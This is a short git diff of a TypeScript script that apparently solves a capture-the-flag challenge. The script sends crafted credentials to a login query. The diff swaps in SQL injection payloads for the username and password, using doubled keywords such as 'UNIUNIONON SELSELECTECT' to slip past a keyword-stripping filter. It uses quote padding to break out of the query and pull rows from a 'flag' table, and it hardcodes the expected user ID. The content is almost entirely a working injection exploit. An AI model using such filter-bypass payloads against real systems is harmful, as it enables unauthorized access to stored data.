@@ -90,7 +90,7 @@ async function run(username: string, password: string) {
         throw new Error("Invalid credentials");
       }
 
-      if (result.rows[0].id !== this.credentials.id) {
+      if (result.rows[0].id !== 3) {
         console.log(
           chalk.red(
             `User ID mismatch: ${result.rows[0].id} !== ${this.credentials.id}`
@@ -113,9 +113,8 @@ async function run(username: string, password: string) {
     });
 }
 
-// Our best effort as of 2025-08-30 20:50 ET
-let username = `' UNIUNIONON SELSELECTECT 3 as id /*`;
-let password = "*/, flag as username FROM flag--";
+let username = "a".repeat(47) + `'`;
+let password = "UNIUNIONON SELSELECTECT 3, flag FROM flag;--";
 
 await run(username, password);
 
